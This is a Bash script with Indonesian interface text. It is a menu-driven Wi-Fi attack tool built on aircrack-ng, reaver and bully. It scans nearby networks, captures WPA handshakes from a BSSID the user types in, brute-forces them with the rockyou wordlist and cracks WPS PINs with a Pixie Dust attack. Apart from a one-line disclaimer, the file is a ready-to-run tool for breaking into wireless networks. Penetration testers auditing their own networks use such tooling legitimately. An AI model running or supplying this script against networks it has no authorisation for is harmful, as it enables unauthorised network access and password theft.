#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Global variables
selected_interface=""
monitor_interface=""
scan_file=""

# Banner
show_banner() {
    clear
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════════════╗"
    echo "║           Advanced WiFi Pentesting Tool      ║"
    echo "║                 Debian Terminal              ║"
    echo "╚══════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${YELLOW}Disclaimer: Gunakan hanya untuk jaringan yang Anda miliki!${NC}"
    echo
}

# Check if run as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Script harus dijalankan sebagai root!${NC}"
        echo "Gunakan: sudo ./wifi_tool.sh"
        exit 1
    fi
}

# Install requirements
install_requirements() {
    echo -e "${YELLOW}[*] Menginstall requirements...${NC}"
    
    apt update
    apt install -y aircrack-ng \
                   reaver \
                   bully \
                   hashcat \
                   hcxdumptool \
                   hcxtools \
                   wireshark \
                   tshark \
                   macchanger \
                   cowpatty \
                   pixiewps \
                   git \
                   curl
    
    # Install wordlist jika belum ada
    if [[ ! -f "/usr/share/wordlists/rockyou.txt" ]]; then
        echo -e "${YELLOW}[*] Downloading wordlist...${NC}"
        apt install -y wordlists
        if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
            gunzip /usr/share/wordlists/rockyou.txt.gz
        fi
    fi
    
    echo -e "${GREEN}[+] Semua requirements terinstall!${NC}"
    sleep 2
}

# Select wireless interface
select_interface() {
    echo -e "${YELLOW}[*] Mencari interface WiFi...${NC}"
    
    # Find wireless interfaces
    interfaces=$(iwconfig 2>/dev/null | grep -o "^[[:alnum:]]*" | grep -v "lo")
    
    if [[ -z "$interfaces" ]]; then
        echo -e "${RED}[!] Tidak ada interface WiFi ditemukan!${NC}"
        echo -e "${YELLOW}[*] Coba gunakan: ip link show${NC}"
        ip link show
        return 1
    fi
    
    echo -e "${BLUE}[+] Interface WiFi ditemukan:${NC}"
    PS3="Pilih interface: "
    select interface in $interfaces; do
        if [[ -n "$interface" ]]; then
            selected_interface=$interface
            echo -e "${GREEN}[+] Interface dipilih: $selected_interface${NC}"
            break
        else
            echo -e "${RED}[!] Pilihan tidak valid!${NC}"
        fi
    done
    
    return 0
}

# Setup monitor mode
setup_monitor() {
    local interface=$1
    echo -e "${YELLOW}[*] Menghentikan proses yang mengganggu...${NC}"
    airmon-ng check kill > /dev/null 2>&1
    
    echo -e "${YELLOW}[*] Memulai monitor mode pada $interface...${NC}"
    airmon-ng start $interface > /dev/null 2>&1
    
    # Cari interface monitor
    monitor_interface=$(iwconfig 2>/dev/null | grep "mon" | cut -d' ' -f1 | head -1)
    
    if [[ -n "$monitor_interface" ]]; then
        echo -e "${GREEN}[+] Monitor mode aktif: $monitor_interface${NC}"
        return 0
    else
        echo -e "${RED}[!] Gagal memulai monitor mode!${NC}"
        return 1
    fi
}

# Scan WiFi networks dengan airodump-ng
scan_wifi_airodump() {
    echo -e "${YELLOW}[*] Memindai jaringan WiFi sekitar...${NC}"
    echo -e "${CYAN}[Info] Tekan Ctrl+C untuk menghentikan scan${NC}"
    
    # Setup monitor mode jika belum aktif
    if [[ -z "$monitor_interface" ]]; then
        if ! select_interface; then
            return 1
        fi
        if ! setup_monitor $selected_interface; then
            return 1
        fi
    fi
    
    scan_file="wifi_scan_$(date +%Y%m%d_%H%M%S)"
    echo -e "${YELLOW}[*] Scan disimpan di: ${scan_file}*.csv${NC}"
    
    # Scan dengan airodump-ng
    timeout 30s airodump-ng $monitor_interface --write $scan_file --output-format csv
    
    # Parse dan tampilkan hasil scan
    if [[ -f "${scan_file}-01.csv" ]]; then
        parse_scan_results "${scan_file}-01.csv"
    else
        echo -e "${RED}[!] File scan tidak ditemukan!${NC}"
        return 1
    fi
}

# Parse dan tampilkan hasil scan
parse_scan_results() {
    local scan_file=$1
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════════════╗"
    echo "║               HASIL SCAN WiFi                ║"
    echo "╚══════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    # Parse CSV file dan format output
    awk -F',' '
    BEGIN {
        printf "%-18s %-4s %-8s %-12s %-10s %-15s\n", 
        "BSSID", "CH", "Sinyal", "Enkripsi", "Clients", "ESSID"
        printf "%-18s %-4s %-8s %-12s %-10s %-15s\n", 
        "----------------", "----", "--------", "------------", "----------", "---------------"
    }
    /^BSSID/ { next }  # Skip header
    /^Station/ { exit } # Stop at client section
    {
        if (length($1) == 17 && $1 ~ /:/) {  # Valid BSSID
            bssid = $1
            channel = $4
            speed = $5
            encryption = $6
            essid = $14
            clients = "0"
            
            # Clean up ESSID
            gsub(/^[ \t]+|[ \t]+$/, "", essid)
            if (essid == "") essid = "(Hidden)"
            
            # Clean up encryption
            gsub(/ /, "", encryption)
            
            printf "%-18s %-4s %-8s %-12s %-10s %-15s\n", 
            bssid, channel, speed, encryption, clients, substr(essid, 1, 20)
        }
    }' "$scan_file"
}

# Quick scan dengan iwlist
quick_scan() {
    echo -e "${YELLOW}[*] Quick scan dengan iwlist...${NC}"
    
    if ! select_interface; then
        return 1
    fi
    
    echo -e "${CYAN}"
    iwlist $selected_interface scan | grep -E "ESSID|Channel|Encryption|Signal" | head -20
    echo -e "${NC}"
}

# Detailed scan
detailed_scan() {
    echo -e "${YELLOW}[*] Detailed network scan...${NC}"
    
    if [[ -z "$monitor_interface" ]]; then
        if ! select_interface; then
            return 1
        fi
        if ! setup_monitor $selected_interface; then
            return 1
        fi
    fi
    
    echo -e "${GREEN}[*] Menampilkan informasi detail jaringan...${NC}"
    echo -e "${CYAN}"
    airodump-ng $monitor_interface --band abg
    echo -e "${NC}"
}

# Scan menu
scan_menu() {
    while true; do
        echo -e "${BLUE}"
        echo "╔══════════════════════════════════════╗"
        echo "║             SCAN MENU                ║"
        echo "╚══════════════════════════════════════╝"
        echo -e "${NC}"
        echo "1. Quick Scan (iwlist)"
        echo "2. Standard Scan (airodump-ng)"
        echo "3. Detailed Scan"
        echo "4. Lihat Hasil Scan Terakhir"
        echo "5. Kembali ke Menu Utama"
        echo
        
        read -p "Pilihan [1-5]: " choice
        
        case $choice in
            1)
                quick_scan
                ;;
            2)
                scan_wifi_airodump
                ;;
            3)
                detailed_scan
                ;;
            4)
                if [[ -f "${scan_file}-01.csv" ]]; then
                    parse_scan_results "${scan_file}-01.csv"
                else
                    echo -e "${RED}[!] Tidak ada hasil scan sebelumnya!${NC}"
                fi
                ;;
            5)
                return 0
                ;;
            *)
                echo -e "${RED}[!] Pilihan tidak valid!${NC}"
                ;;
        esac
        
        echo
        read -p "Tekan Enter untuk melanjutkan..."
    done
}

# Capture handshake
capture_handshake() {
    echo -e "${YELLOW}[*] Mode Capture Handshake${NC}"
    
    if [[ ! -f "${scan_file}-01.csv" ]]; then
        echo -e "${RED}[!] Lakukan scan terlebih dahulu!${NC}"
        return 1
    fi
    
    parse_scan_results "${scan_file}-01.csv"
    
    echo
    read -p "Masukkan BSSID target: " bssid
    read -p "Masukkan channel target: " channel
    read -p "Nama file output (tanpa ekstensi): " output_file
    
    if [[ -z "$monitor_interface" ]]; then
        if ! select_interface; then
            return 1
        fi
        if ! setup_monitor $selected_interface; then
            return 1
        fi
    fi
    
    echo -e "${GREEN}[*] Menangkap handshake pada BSSID: $bssid${NC}"
    echo -e "${YELLOW}[*] Tekan Ctrl+C ketika mendapatkan handshake${NC}"
    
    airodump-ng -c $channel --bssid $bssid -w $output_file $monitor_interface
}

# WPA bruteforce
wpa_bruteforce() {
    echo -e "${YELLOW}[*] Mode Bruteforce WPA${NC}"
    
    read -p "Masukkan path file handshake (.cap): " cap_file
    read -p "Masukkan path wordlist (kosong untuk rockyou.txt): " wordlist
    
    wordlist=${wordlist:-"/usr/share/wordlists/rockyou.txt"}
    
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[!] File $cap_file tidak ditemukan!${NC}"
        return 1
    fi
    
    if [[ ! -f "$wordlist" ]]; then
        echo -e "${RED}[!] File wordlist $wordlist tidak ditemukan!${NC}"
        echo -e "${YELLOW}[*] Wordlist yang tersedia:${NC}"
        find /usr/share/wordlists/ -name "*.txt" 2>/dev/null | head -10
        return 1
    fi
    
    echo -e "${GREEN}[*] Memulai bruteforce WPA...${NC}"
    echo -e "${YELLOW}[*] Wordlist: $wordlist${NC}"
    aircrack-ng -w "$wordlist" "$cap_file"
}

# WPS crack
wps_crack() {
    echo -e "${YELLOW}[*] Mode Crack WPS${NC}"
    
    if [[ ! -f "${scan_file}-01.csv" ]]; then
        echo -e "${RED}[!] Lakukan scan terlebih dahulu!${NC}"
        return 1
    fi
    
    parse_scan_results "${scan_file}-01.csv"
    
    echo
    read -p "Masukkan BSSID target: " bssid
    read -p "Masukkan channel target: " channel
    
    if [[ -z "$selected_interface" ]]; then
        if ! select_interface; then
            return 1
        fi
    fi
    
    echo -e "${GREEN}[*] Scanning WPS vulnerability...${NC}"
    wash -i $selected_interface
    
    echo -e "${GREEN}[*] Memulai WPS crack dengan reaver...${NC}"
    reaver -i $selected_interface -b $bssid -c $channel -vv -K 1
    
    echo -e "${YELLOW}[*] Atau mencoba dengan bully...${NC}"
    bully -b $bssid -c $channel $selected_interface -v 3
}

# Cleanup
cleanup() {
    echo -e "${YELLOW}[*] Membersihkan...${NC}"
    if [[ -n "$monitor_interface" ]]; then
        airmon-ng stop $monitor_interface > /dev/null 2>&1
    fi
    service network-manager restart
    echo -e "${GREEN}[+] Cleanup selesai${NC}"
}

# Main menu
main_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}Status:${NC}"
        echo -e "Interface: ${GREEN}$selected_interface${NC}"
        echo -e "Monitor: ${GREEN}$monitor_interface${NC}"
        echo -e "Scan File: ${GREEN}$scan_file${NC}"
        echo
        echo -e "${BLUE}Pilih opsi:${NC}"
        echo "1. Install Requirements"
        echo "2. Scan WiFi Networks"
        echo "3. Capture Handshake"
        echo "4. WPA Bruteforce"
        echo "5. WPS Crack PIN"
        echo "6. Cleanup & Exit"
        echo
        
        read -p "Pilihan [1-6]: " choice
        
        case $choice in
            1)
                install_requirements
                ;;
            2)
                scan_menu
                ;;
            3)
                capture_handshake
                ;;
            4)
                wpa_bruteforce
                ;;
            5)
                wps_crack
                ;;
            6)
                cleanup
                echo -e "${GREEN}[+] Keluar...${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Pilihan tidak valid!${NC}"
                ;;
        esac
        
        echo
        read -p "Tekan Enter untuk melanjutkan..."
    done
}

# Trap Ctrl+C
trap cleanup EXIT

# Check root and start
check_root
main_menu
